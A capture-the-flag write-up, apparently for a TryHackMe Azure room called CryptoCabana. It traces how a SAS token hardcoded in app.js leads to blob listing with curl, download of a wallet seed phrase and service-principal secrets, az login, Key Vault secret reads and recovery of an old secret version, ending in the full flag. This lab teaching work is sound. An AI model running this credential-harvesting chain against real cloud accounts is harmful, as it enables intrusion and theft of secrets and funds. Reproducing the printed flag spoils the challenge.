# CryptoCabana

<img width="1910" height="353" alt="image" src="https://github.com/user-attachments/assets/7f5d7c96-36f9-4582-b5d5-61fbc4442297" />

----

## login to azure with credintails 

<img width="1912" height="586" alt="image" src="https://github.com/user-attachments/assets/41f6488d-1d80-43ac-b853-3bbd861eaf7c" />

📚 What is Azure?
-----------------

Azure is Microsoft's cloud platform. It has services like:

-   Blob Storage → Like Google Drive or Dropbox for files

-   Key Vault → A secure place to store passwords, keys, and secrets

-   Storage Account → Container that holds Blob Storage, Tables, Queues

* * * * *

🔍 Step 1: Reconnaissance: Finding the SAS Token
-------------------------------------------------

### What we did:

We visited the website and viewed the source code. In the `app.js` file, we found:

```javascript

const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";
```

<img width="1744" height="515" alt="image" src="https://github.com/user-attachments/assets/e2553f1b-6309-48ba-a5c7-762da165da60" />

### What this means:

-   SAS Token = A "key" that gives access to Azure Storage

-   `sp=rl` = Read + List permissions

-   `se=2099-12-31` = Valid until 2099 (very long!)

### Command used:

```bash

# Save the SAS token as a variable
SAS_TOKEN="?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
```

* * * * *

📦 Step 2: Exploring Azure Storage
----------------------------------

### What we did:

We used the SAS token to list all containers in the storage account.

```bash

curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&${SAS_TOKEN}"
```

### What we found:

```xml

<Container><Name>$web</Name></Container>
<Container><Name>backups</Name></Container>
<Container><Name>vault</Name></Container>
```

<img width="1681" height="247" alt="image" src="https://github.com/user-attachments/assets/dc00b74f-975f-4ce6-ace4-497d91363276" />

### What this means:

-   `$web` → Static website files

-   `backups` → Backup storage

-   `vault` → Vault storage (this is where the flag is!)

* * * * *

📄 Step 3: Listing Files in the Vault
-------------------------------------

### What we did:

Listed all files in the `vault` container.

```bash

curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&${SAS_TOKEN}"
```

### What we found:

```xml

<Name>seed_phrase.txt</Name>
<Name>backup-service-account.json</Name>
```

<img width="1660" height="248" alt="image" src="https://github.com/user-attachments/assets/d1b8bc1f-b30b-4cf8-b317-8aaed8b16631" />

* * * * *

📝 Step 4: Downloading the Seed Phrase
--------------------------------------

### What we did:

Downloaded `seed_phrase.txt`.

```bash

curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/seed_phrase.txt?${SAS_TOKEN}"
```

### What we found:

```text

velvet cabana rebuild scatter obvious wallet drift lagoon punchline receipt orbit shrimp
```

<img width="1040" height="160" alt="image" src="https://github.com/user-attachments/assets/20b61a81-761f-49d3-b6ab-b44c798e9277" />

### What this means:

This is a 12-word seed phrase for a cryptocurrency wallet. It's like a master password that can generate all your crypto keys. The fact it was left in plaintext in Azure Storage is a huge security mistake.

* * * * *

🔑 Step 5: Downloading Service Account Credentials
--------------------------------------------------

### What we did:

Downloaded `backup-service-account.json`.

```bash

curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?${SAS_TOKEN}"
```

### What we found:

```json

{
 "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
 "client_secret": "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg",
 "key_vault_name": "ccabana-kv-f5scjagc",
 "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
 "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
}
```

<img width="1154" height="246" alt="image" src="https://github.com/user-attachments/assets/fb4fa869-90f7-496c-a0c3-cb815bd2974c" />

### What this means:

-   Service Principal = An "application account" that can access Azure

-   client_id = Username for this account

-   client_secret = Password for this account

-   key_vault_name = The name of the Key Vault where secrets are stored

* * * * *

🔓 Step 6: Logging into Azure
-----------------------------

### What we did:

Used the service principal credentials to log into Azure CLI.

```bash

az login --service-principal\
 --username "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5"\
 --password "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg"\
 --tenant "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
```

<img width="1204" height="416" alt="image" src="https://github.com/user-attachments/assets/8d47c0ed-f4b8-4a4d-ac41-143e07af1f37" />

### What this means:

We're now authenticated as the backup service account and can access Azure resources.

* * * * *

🔐 Step 7: Exploring the Key Vault
----------------------------------

### What we did:

Listed all secrets in the Key Vault.

```bash

az keyvault secret list\
 --vault-name ccabana-kv-f5scjagc\
 --output table
```

### What we found:

```text

Name         Enabled
-----------  -------
key-shard-1  True
key-shard-2  True
key-shard-3  True
master-key   True
```

<img width="1368" height="258" alt="image" src="https://github.com/user-attachments/assets/a05589a7-f422-453a-8e7b-328341c0049f" />

### What this means:

The flag has been split into 3 "shards" (pieces) and stored as secrets, plus a master key.

* * * * *

🧩 Step 8: Reading the Key Shards
---------------------------------

### What we did:

Read each key shard's value.

```bash

az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-1 --query "value" -o tsv
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2 --query "value" -o tsv
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-3 --query "value" -o tsv
```

### What we found:

-   key-shard-1: `THM{n0t_ur`

-   key-shard-2: `Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.`

-   key-shard-3: `ur_c01ns!}`

<img width="1138" height="216" alt="image" src="https://github.com/user-attachments/assets/11e0c670-a9d5-4fd4-955d-6749cb3310f7" />

### What this means:

The flag is `THM{n0t_ur...ur_c01ns!}` but we're missing the middle part.

* * * * *

🔍 Step 9: Finding the Missing Piece
------------------------------------

### What we did:

The hint says "old value should still be recoverable": so we looked at older versions of the secrets.

```bash

# List all versions of key-shard-2
az keyvault secret show \
  --vault-name "ccabana-kv-f5scjagc" \
  --name "key-shard-2" \
  --version "3d6492d2c6f74123bc754a9ded22b2a0" \
  --query value -o tsv
```

### What we found:

An older version of `key-shard-2` had the value: `_k3ys_n0t_`

<img width="994" height="202" alt="image" src="https://github.com/user-attachments/assets/2458ee4e-ecc5-4c55-8d1a-11befac68e8c" />

* * * * *

🏆 Step 10: Combining the Flag
------------------------------

### The Pieces:

-   key-shard-1: `THM{n0t_ur`

-   key-shard-2 (old): `_k3ys_n0t_`

-   key-shard-3: `ur_c01ns!}`

### Combined Flag:

```text

THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```

